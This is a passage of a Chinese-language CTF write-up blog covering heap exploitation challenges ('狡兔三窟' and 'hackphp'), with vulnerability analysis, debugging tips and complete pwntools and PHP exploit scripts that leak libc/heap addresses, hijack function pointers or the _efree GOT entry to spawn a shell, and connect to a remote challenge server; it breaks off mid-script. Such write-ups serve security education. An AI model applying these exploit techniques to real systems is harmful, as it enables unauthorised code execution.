class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;to edit\n&quot;</span>, name)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_backup</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;MEME&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_content = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;Lin 1=&quot;&#123;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;Lin2&gt;</span></span><br><span class="line"><span class="string">/bin/sh</span></span><br><span class="line"><span class="string">&lt;/Lin2&gt;</span></span><br><span class="line"><span class="string">&lt;Lin3&gt;</span></span><br><span class="line"><span class="string">/bin/sh</span></span><br><span class="line"><span class="string">&lt;/Lin3&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&quot;a&quot;</span>*<span class="number">0x500</span>)</span><br><span class="line">file_content += <span class="string">&quot;a&quot;</span> * <span class="number">0x70</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x7</span></span><br><span class="line">file_content += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;Lin4&gt;</span></span><br><span class="line"><span class="string">/bin/sh</span></span><br><span class="line"><span class="string">&lt;/Lin4&gt;</span></span><br><span class="line"><span class="string">&lt;/Lin&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">parse(file_content)</span><br><span class="line">show_backup(<span class="string">&quot;Lin&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Useless&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;Lin&quot;</span>, <span class="string">&quot;1212&quot;</span>)</span><br><span class="line">show_backup(<span class="string">&quot;Lin&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span> * <span class="number">0x7</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap_address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;Lin3&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(one_gadget[<span class="number">3</span>] + libc.address))</span><br><span class="line">edit(<span class="string">&quot;Lin3&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(one_gadget[<span class="number">3</span>] + libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x70</span> + p64(heap_address- <span class="number">0x1e0</span>)</span><br><span class="line">edit(<span class="string">&quot;Lin&quot;</span>, payload)</span><br><span class="line">edit(<span class="string">&quot;Lin&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">show_backup(<span class="string">&quot;Lin4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="狡兔三窟"><a href="#狡兔三窟" class="headerlink" title="狡兔三窟"></a>狡兔三窟</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>是个<code>cpp</code>的<code>pwn</code>，首先看一下<code>ida</code>，程序中包含两个重要的结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> total_node      struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_13)</span><br><span class="line"><span class="number">00000000</span> note1           dq ?</span><br><span class="line"><span class="number">00000008</span> note2           dq ?</span><br><span class="line"><span class="number">00000010</span> backup          dq ?</span><br><span class="line"><span class="number">00000018</span> total_node      ends</span><br><span class="line"><span class="number">00000018</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> node            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_14)</span><br><span class="line"><span class="number">00000000</span> func_ptr        dq ?</span><br><span class="line"><span class="number">00000008</span> is_cleared      dq ?</span><br><span class="line"><span class="number">00000010</span> vector_start    dq ?</span><br><span class="line"><span class="number">00000018</span> vector_current  dq ?</span><br><span class="line"><span class="number">00000020</span> vector_end      dq ?</span><br><span class="line"><span class="number">00000028</span> node            ends</span><br></pre></td></tr></table></figure>

<p><code>total_node</code>的结构体对应的是<code>NoteStorageImpl</code>，<code>node</code>结构体对应的是<code>NoteImpl</code>，其中<code>total_node</code>中的每一个<code>node</code>是<code>node</code>结构体的一个实例，<code>backup</code>包含两个成员变量，其中第一个表明<code>node</code>是否被删除，第二个成员变量指向一个<code>note</code>结构体。</p>
<p>程序一共提供了六种功能，首先看一下<code>editHouse</code>，首先判断<code>note1</code>是否被删除（通过<code>bool</code>函数判断），如果被删除则针对<code>note2</code>调用<code>add</code>函数，<code>add</code>函数首先会判断用户是否会调用<code>clear</code>，该函数只能调用一次，作用就是将<code>vector_current</code>指针指向<code>vector_start</code>即指向<code>vector</code>的开头。接着将用户输入的内容压入<code>vector</code>，空间扩展操作和<code>vector</code>类似，如果空间不够即<code>vector_end == vector_curret</code>则申请两倍大小的空间（这里的两倍的大小是根据<code>vector_end-vector_current</code>计算的），释放原始空间。</p>
<p>接着是<code>save_house</code>，函数实际上调用的是<code>shrik_to_fit</code>函数，函数的作用就是缩小<code>vector</code>的内存空间。会申请一个<code>vecotr_current-vector_start</code>大小的内存空间，将<code>vector</code>中的内容拷贝之后释放原空间，并将<code>vector_end=vector_current</code>，也就是说下一次<code>push</code>的时候会触发<code>vector</code>的扩容。</p>
<p>接着就是<code>backup</code>函数，该函数只能针对<code>note1</code>进行备份。也就是第二个成员变量指向<code>note1</code></p>
<p>接着就是<code>encourage</code>函数，该函数如果判断<code>note1</code>被删除了之后，会调用<code>backup</code>中指向的<code>note</code>结构体的<code>func_ptr</code>即函数指针</p>
<p>接着就是<code>delHouse</code>函数，函数的作用是删除<code>note</code>，但是只能在<code>backup</code>调用之后针对<code>note1</code>进行删除。删除会清空<code>total_note</code>中的<code>note1</code>指针，释放<code>note</code>结构体，该结构体的大小为<code>0x350</code>。</p>
<p>最后就是<code>show</code>函数，函数会打印<code>backup</code>结构体中的<code>note</code>指针指向的结构体的第一个成员变量也就是函数指针的内容，但是需要注意的是这里<code>show</code>函数也是需要<code>note1</code>删除之后才能进行调用的。</p>
<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>漏洞是一个<code>UAF</code>，由处理逻辑导致的，即<code>show</code>和<code>encourage</code>函数会经过<code>backup</code>处理删除之后的<code>note1</code>的结构体堆块。</p>
<p>首先考虑的就是<code>show</code>函数的调用导致的信息泄漏，正常情况下删除<code>note</code>结构体的时候，结构体所在的堆块会存储到<code>tcache</code>中，第一个成员变量会被覆写为<code>0</code>，也就是说再调用<code>show</code>函数无法输出任何的东西。并且我们无法任意次数的释放指定大小的堆块，因此无法通过这个堆块泄漏出<code>libc</code>地址。</p>
<p>只能首先释放一个<code>0x350</code>大小的结构体，之后再删除<code>note</code>结构体，从而泄漏出堆地址。这里采用的释放指定大小的堆块的方式是通过<code>shrik_to_fit</code>函数和<code>vector</code>的两次扩容实现的。假设我们要释放<code>size</code>大小的堆块，那么首先<code>add((size-0x10)/2)</code>，再调用<code>shrik_to_fit</code>函数，此时堆块的大小就会缩减为<code>(size-0x10)/2 + 0x10</code>大小，也就是指定大小的一半，接着再次<code>add</code>相同大小的内容，那么在<code>push</code>第一个字节的时候<code>vector</code>就会触发扩容操作，此时申请得到指定<code>size</code>大小的堆块，在<code>push</code>最后一个字节的时候又会触发一次扩容操作，此时会释放<code>size</code>大小的堆块而申请<code>size*2</code>的堆块</p>
<p>那么在进行<code>note</code>删除的时候就会释放结构体堆块，也就是<code>0x350</code>的堆块，此时由于<code>tcache</code>中有一个堆块了，因此这里第一个成员变量会被覆写为堆地址，也就是我们可以泄漏得到堆地址了。</p>
<p>做到泄漏堆地址之后<code>libc</code>地址的泄漏就好多了，还是利用相同的方法，在对<code>note2</code>进行<code>add</code>的时候申请指定大小的堆块即<code>0x350</code>大小的堆块，注意到此时申请的堆块就是<code>note1</code>的结构体堆块，调试过程中发现结构体偏移<code>0x1b0</code>位置残留有一个<code>malloc</code>的函数指针，利用字符串拼接和<code>show</code>函数泄漏该指针即可。</p>
<p>在得到<code>libc</code>基地址和<code>heap</code>地址之后就可以调用<code>clear</code>函数将<code>vector_current</code>指针指向<code>vector_start</code>位置，也就是<code>note1</code>结构体的函数指针位置，覆写该指针为<code>gadget</code>，调用即可<code>getshell</code>。</p>
<p>这里远程和本地的堆偏移好像不太一样相差了<code>0xc00</code>，不知道为什么。</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./easycpp&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;source gdb_dbg&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>, <span class="number">0xe5617</span>, <span class="number">0xe561e</span>, <span class="number">0xe5622</span>, <span class="number">0x10a428</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.216.214&#x27;</span>, <span class="number">27807</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>, <span class="number">0xe5617</span>, <span class="number">0xe561e</span>, <span class="number">0xe5622</span>, <span class="number">0x10a428</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content, is_clear=<span class="literal">False</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> is_clear:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;to clear it?(y/N)&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;to clear it?(y/N)&quot;</span>, <span class="string">&quot;N&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;(q to quit):&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        p.sendline(i)</span><br><span class="line">    p.sendline(<span class="string">&quot;q&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encourage</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x55555576de60</span></span><br><span class="line"></span><br><span class="line">content = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a0</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(content)</span><br><span class="line">backup()</span><br><span class="line">save()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a0</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(content)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">heap_address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">content = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a0</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(content)</span><br><span class="line">save()</span><br><span class="line">content = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    content.append(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(content)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;2&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;heap address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">content = []</span><br><span class="line">content.append(p64(heap_address - <span class="number">0x2230</span> + <span class="number">0x8</span> - <span class="number">0xc00</span>))</span><br><span class="line">content.append(p64(one_gadget[<span class="number">2</span>] + libc.address))</span><br><span class="line"><span class="comment"># content.append(p64(libc.sym[&#x27;puts&#x27;]))</span></span><br><span class="line">add(content, <span class="literal">True</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;source gdb_dbg&quot;)</span></span><br><span class="line"></span><br><span class="line">encourage()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 0x55555576de60</span></span><br><span class="line"><span class="comment"># content = []</span></span><br><span class="line"><span class="comment"># for i in range(0x1a0):</span></span><br><span class="line"><span class="comment">#     content.append(&quot;1&quot;)</span></span><br><span class="line"><span class="comment"># add(content)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># backup()</span></span><br><span class="line"><span class="comment"># delete()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># content = []</span></span><br><span class="line"><span class="comment"># for i in range(0x1a0):</span></span><br><span class="line"><span class="comment">#     content.append(&quot;1&quot;)</span></span><br><span class="line"><span class="comment"># add(content)</span></span><br><span class="line"><span class="comment"># save()</span></span><br><span class="line"><span class="comment"># add(content)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># encourage()</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure>

<h2 id="hackphp"><a href="#hackphp" class="headerlink" title="hackphp"></a>hackphp</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>这是一个<code>webpwn</code>，程序给出了四种功能分别是<code>add,delete,edit,get</code>。其中<code>add</code>函数的代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">zif_hackphp_create</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 size[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = execute_data-&gt;This.u2.next;</span><br><span class="line">  size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v2, &amp;unk_2000, size) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = (<span class="type">char</span> *)_emalloc(size[<span class="number">0</span>]);</span><br><span class="line">    buf_size = size[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(size[<span class="number">0</span>] - <span class="number">0x100</span>) &lt;= <span class="number">0x100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        return_value-&gt;u1.type_info = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _efree();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return_value-&gt;u1.type_info = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>buf</code>是全局变量，然后可以看到这里在将申请的堆块的地址写入到<code>buf</code>位置之后又将申请得到的堆块释放掉了，因此之后会存在一个<code>UAF</code>漏洞。</p>
<p><code>php</code>中的空闲堆块的管理也是存在一个全局链表，相同大小的堆块释放之后就会存储到链表中，通过<code>fd</code>进行连接。因此这里我们可以利用<code>UAF</code>将堆块分配到<code>_efree.got</code>表位置，覆写其地址为<code>system</code>的地址，之后就可以执行<code>readflag</code>程序了。</p>
<p>但是这里使用其给出的<code>add</code>函数无法达到效果，因此其总是先申请之后再进行释放，也就是相同大小永远只申请第一个堆块。因此这里我们需要首先消耗掉一个堆块。这里采用的是<code>str_repeat</code>函数，该函数会申请我们传入参数长度大小的堆块。那么这里我们先使用<code>edit</code>函数覆写<code>fd</code>指针指向<code>_efree.got</code>的位置，接着连续申请两次并在第二次参数设置为为<code>system</code>即可覆写了。</p>
<p>这里还有个<code>libc/elf</code>基地址的问题，一般来说在<code>webpwn</code>中都可以直接加载<code>/proc/self/maps</code>直接得到地址。</p>
<h3 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h3><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/post/id/204404">参考</a></p>
<p>当我们启动<code>php</code>执行我们的脚本即<code>gdb exp.php</code>的时候如果直接设定参数运行无法下断点，因为此时<code>hackphp.so</code>还没有加载进来，我们遵循的方法就是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb php</span><br><span class="line">&gt; run</span><br><span class="line">&gt; crtl + c (signal 2)</span><br></pre></td></tr></table></figure>

<p>也就是说首先是<code>run</code>，此时<code>php</code>在等待我们的输入，这时输入<code>crtl + c</code>，那么此时就会断下来，并且此时已经加载了<code>hackphp.so</code>了。此时在设置参数<code>set args exp.php</code>，设置断点，再<code>run</code>，那么再次运行就会保留上次的断点，也就可以断下了</p>
<p>改题目中的<code>source</code>文件如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">b zif_hackphp_create</span><br><span class="line">b zif_hackphp_get</span><br><span class="line">b zif_hackphp_edit</span><br><span class="line">b zif_hackphp_delete</span><br><span class="line"><span class="built_in">set</span> args exp.php</span><br><span class="line">r</span><br></pre></td></tr></table></figure>

<p>启动之后<code>source gdb_dbg</code>， 之后再<code>crtl + c</code>就可以成功断下了。</p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="variable">$result</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$x</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$ret</span>,<span class="variable">$sys</span>;</span><br><span class="line">    <span class="variable">$pattern1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc-2.31.so/&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20190902\/hackphp.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>, <span class="variable">$buffer</span>, <span class="variable">$ret</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern1</span>, <span class="variable">$buffer</span>, <span class="variable">$sys</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;callback&quot;</span>);</span><br><span class="line"><span 